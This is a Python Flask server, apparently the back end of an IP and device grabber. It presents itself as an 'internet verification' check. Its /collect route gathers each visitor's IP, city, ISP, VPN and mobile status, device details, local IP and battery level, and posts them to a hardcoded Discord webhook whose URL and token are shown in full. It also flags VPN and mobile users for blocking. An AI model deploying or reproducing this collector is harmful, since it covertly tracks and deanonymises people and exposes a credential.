from flask import Flask, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

# TODO: Wklej tutaj swój skopiowany z Discorda adres URL webhooka
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1528518546366136360/G_M-BUN3-QYO6OysKNaeuuHEGVqxsbqYP862p9eAdpWu2C9UQmdHFrMgHjsLLRbyKwcq"

@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type, ngrok-skip-browser-warning')
    response.headers.add('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
    return response

def check_vpn(ip):
    try:
        r = requests.get(f'http://ip-api.com/json/{ip}?fields=proxy,hosting,isp,org,country,city,mobile', timeout=3)
        if r.status_code == 200:
            return r.json()
    except:
        pass
    return None

def shorten(value, max_len=80):
    if value is None: return 'no'
    s = str(value)
    return s[:max_len] + '...' if len(s) > max_len else s

@app.route('/collect', methods=['GET', 'POST', 'OPTIONS'])
def collect():
    if request.method == 'OPTIONS':
        return app.make_response(('ok', 200))

    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    vpn_info = check_vpn(ip)
    
    if request.method == 'POST':
        data = request.get_json() or {}
        
        if 'useragent' not in data:
            return jsonify({"status": "ok", "block": False}), 200

        # Budowanie ładnego logu tekstowego dla Discorda
        log_lines = []
        log_lines.append("```diff")
        log_lines.append(f"=== GLOBALNA WERYFIKACJA INTERNETU [{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] ===")
        
        if vpn_info:
            log_lines.append("\n📡 IP INFO:")
            log_lines.append(f"   IP Address   : {ip}")
            log_lines.append(f"   Country      : {vpn_info.get('country')}")
            log_lines.append(f"   City         : {vpn_info.get('city')}")
            log_lines.append(f"   ISP          : {vpn_info.get('isp')}")
            log_lines.append(f"   Proxy/VPN    : {'⚠️ YES' if vpn_info.get('proxy') else '✅ NO'}")
            log_lines.append(f"   Mobile (LTE) : {'⚠️ YES' if vpn_info.get('mobile') else '✅ NO'}")
        
        log_lines.append("\n📱 DEVICE INFO:")
        log_lines.append(f"   User-Agent   : {shorten(data.get('useragent'))}")
        log_lines.append(f"   Platform     : {data.get('platform', 'no')}")
        log_lines.append(f"   Screen       : {data.get('screen', 'no')}")
        log_lines.append(f"   Cores / RAM  : {data.get('cores', 'no')} rdzenie / {data.get('memory', 'no')} GB")
        log_lines.append(f"   Language     : {data.get('language', 'no')}")
        
        network = data.get('network', {})
        log_lines.append("\n🌐 NETWORK:")
        if isinstance(network, dict):
            log_lines.append(f"   Type / RTT   : {network.get('type', 'no')} / {network.get('rtt', 'no')} ms")
        log_lines.append(f"   Local IP     : {data.get('localIP', 'no')}")
        
        battery = data.get('battery', {})
        if battery:
            log_lines.append(f"\n🔋 BATTERY: {int(battery.get('level', 0) * 100)}% (Ładowanie: {'✅' if battery.get('charging') else '❌'})")
            
        log_lines.append("```")
        
        discord_message = "\n".join(log_lines)
        
        try:
            requests.post(DISCORD_WEBHOOK_URL, json={"content": discord_message}, timeout=5)
        except Exception as e:
            print(f"Błąd Discorda: {e}")

        should_block = False
        if vpn_info and (vpn_info.get('mobile') or vpn_info.get('proxy')):
            should_block = True
            
        return jsonify({"status": "ok", "block": should_block}), 200

    return jsonify({"status": "ok", "block": False}), 200

@app.route('/')
def home():
    return "Bridge Operating 24/7", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)